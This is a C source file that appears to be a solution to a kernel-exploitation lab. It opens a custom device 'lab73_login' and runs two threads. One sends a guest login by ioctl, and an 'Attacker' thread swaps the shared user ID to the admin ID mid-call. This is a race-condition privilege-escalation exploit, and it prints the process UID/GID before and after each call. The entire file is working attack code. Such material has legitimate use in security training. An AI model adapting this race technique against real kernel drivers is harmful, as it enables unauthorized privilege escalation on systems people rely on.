//gcc -o 3.bin  3.c
#include <stdio.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <unistd.h> // for chdir
#include <stdlib.h> // for system

#define DEVFILE		"lab73_login"

#define CMD_LOGIN       100

#define LAB73WIN_ID	    1032

#define USERID_GUEST	9999
#define PASSWD_GUEST	123456
#define USERID_ADMIN	1337


int fd;

struct login_creds {
	long int userid;
	long int passwd;
};

struct login_creds login;

void *UserLogin(void *arg) {
//void UserLogin(int fd) {
	
	printf("[*] UL: Before Guest Login\n");
    printf("[/] UL: UID <%d>\n", geteuid());
    printf("[/] UL: GID <%d>\n", getegid());
    login.userid = USERID_GUEST;
	login.passwd = PASSWD_GUEST;

    printf("[//] UL: sending ioctl\n\n");
	ioctl(fd, CMD_LOGIN, &login);

	printf("[*] UL: returning ioctl\n");
    printf("[/] UL: UID <%d>\n", geteuid());
    printf("[/] UL: GID <%d>\n\n", getegid());
	
	
	printf("[//] UL: close and exit\n");
    //close(fd);
    pthread_exit(NULL);
	return 0;
}


void *Attacker(void *arg) {
//void Attacker(int fd) {

	sleep(1);
	printf("[*] AL: Before Admin Update\n");
    printf("[/] AL: UID <%d>\n", geteuid());
    printf("[/] AL: GID <%d>\n\n", getegid());
	login.userid = USERID_ADMIN;
	
	
	printf("[//] AL: sending ioctl\n\n");
	ioctl(fd, CMD_LOGIN, &login);
	
	
	printf("[*] AL: returning ioctl\n");
    printf("[/] AL: UID <%d>\n", geteuid());
    printf("[/] AL: GID <%d>\n\n", getegid());
	
	printf("[//] AL: close and exit\n");
	pthread_exit(NULL);
	return 0;
	
	
}

int main(int argc, char *argv[]) {
	
	pthread_t tAttacker, tUserLogin;
	
	printf("[*] Open Device File\n");
	fd = open("/dev/"DEVFILE, O_RDWR);
	if (fd < 0) {
		perror("open");
		return 0;
	}
	
    pthread_create(&tUserLogin, NULL, UserLogin, NULL);
	pthread_create(&tAttacker, NULL, Attacker, NULL);
		
    

	pthread_join(tAttacker, NULL);
    pthread_join(tUserLogin, NULL);
	// Now run 'dmesg | tail' to see the login message
	close(fd);
	return 0;

}
